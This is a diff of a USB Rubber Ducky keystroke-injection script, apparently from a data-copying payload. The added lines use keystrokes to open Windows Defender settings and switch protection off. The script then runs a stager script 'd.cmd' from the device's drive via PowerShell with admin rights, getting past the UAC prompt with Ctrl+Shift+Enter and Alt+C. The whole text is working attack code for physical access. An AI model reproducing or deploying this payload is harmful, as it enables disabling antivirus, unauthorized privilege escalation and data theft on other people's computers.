@@ -1,11 +1,40 @@
+REM Allow USB to enumerate
 DELAY 1000
+
+REM Mitigate Windows defender: thanks to judge2020
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING Windows Defender Settings
+ENTER
+DELAY 100
+REM Why tab and home?
+TAB
+DELAY 100
+HOME
+DELAY 100
+ALT F4
+DELAY 100
+REM Why Windows + a ?
+GUI a
+DELAY 100
+ENTER
+DELAY 100
+GUI a
+
+REM Start 'run' line prompt
 GUI r
 DELAY 100
-
 REM Find ducky drive "_", and run stager script named "d.cmd" big thanks to Diggster
 REM powershell "$u=gwmi Win32_Volume|?{$_.Label -eq'_'}|select name;cd $u.name;.\d.cmd"
 REM Above 'cd' to drive before running, below runs "d.cmd" script with drive leteer included
 STRING powershell ".((gwmi win32_volume -f 'lable=''_''').Name+'d.cmd')"
-ENTER
+DELAY 100
+REM Esclate to local admin
+CONTROL SHIFT ENTER
+DELAY 100
+REM Deal with pop-up prompt for admin esclation
+ALT c
 REM The LED for [CAPSLOCK] will blink 4 times when script has started
 REM  and 4 times again when finished with backups/copying.
